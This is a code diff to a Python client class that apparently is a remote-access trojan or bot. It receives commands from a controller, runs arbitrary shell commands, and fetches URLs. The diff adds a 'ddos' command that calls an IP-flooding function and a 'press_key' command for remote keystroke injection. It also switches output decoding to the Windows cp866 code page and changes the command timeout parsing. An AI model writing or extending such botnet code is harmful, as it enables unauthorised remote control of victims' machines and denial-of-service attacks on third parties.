@@ -97,7 +97,7 @@ class Client:
         print(command)
         # stdout, stderr = proc.communicate(command.encode())
         try:
-            stdout = stdout.decode('utf-8')
+            stdout = stdout.decode('cp866')
         except Exception:
             stdout = str(stdout)
         print(stdout)
@@ -135,9 +135,10 @@ class Client:
             command = self.receive_json()
             if command != ["ping"]:
                 print(command)
-            num_time_limit = 18
+            num_time_limit = 116
             if "time_limit" in command:
-                num_time_limit = int(command.split("time_limit"))
+                num_time_limit = int(command.split("time_limit")[1][0])
+                command = command.split("time_limit")[1][1:]
             complited = False
             with time_limit(num_time_limit, "sleep"):
                 try:
@@ -192,6 +193,10 @@ class Client:
                             command_response = commands.wget_url(command[1])
                         case "dir":
                             command_response = os.listdir()
+                        case "press_key":
+                            command_response = commands.press_key(command[1:])
+                        case "ddos":
+                            command_response = commands.ddos_ip(command[1:])
                         case _:
                             # convCommand = self.arrayToString(command)
                             convCommand = " ".join(command)
